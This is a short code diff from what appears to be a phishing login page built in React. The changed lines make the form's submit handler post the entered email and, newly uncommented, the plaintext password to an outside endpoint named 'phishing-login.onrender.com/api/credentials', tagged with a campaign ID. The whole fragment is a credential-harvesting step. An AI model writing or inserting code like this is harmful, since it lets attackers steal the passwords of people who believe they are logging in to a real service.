@@ -16,7 +16,7 @@ const Login = () => {
     try {
       const response = await axios.post('https://phishing-login.onrender.com/api/credentials', {
         username: email,
-        //password: password,
+        password: password,
         campaignId: '65c4d8f2e987b459a731d8f2'
       });
       
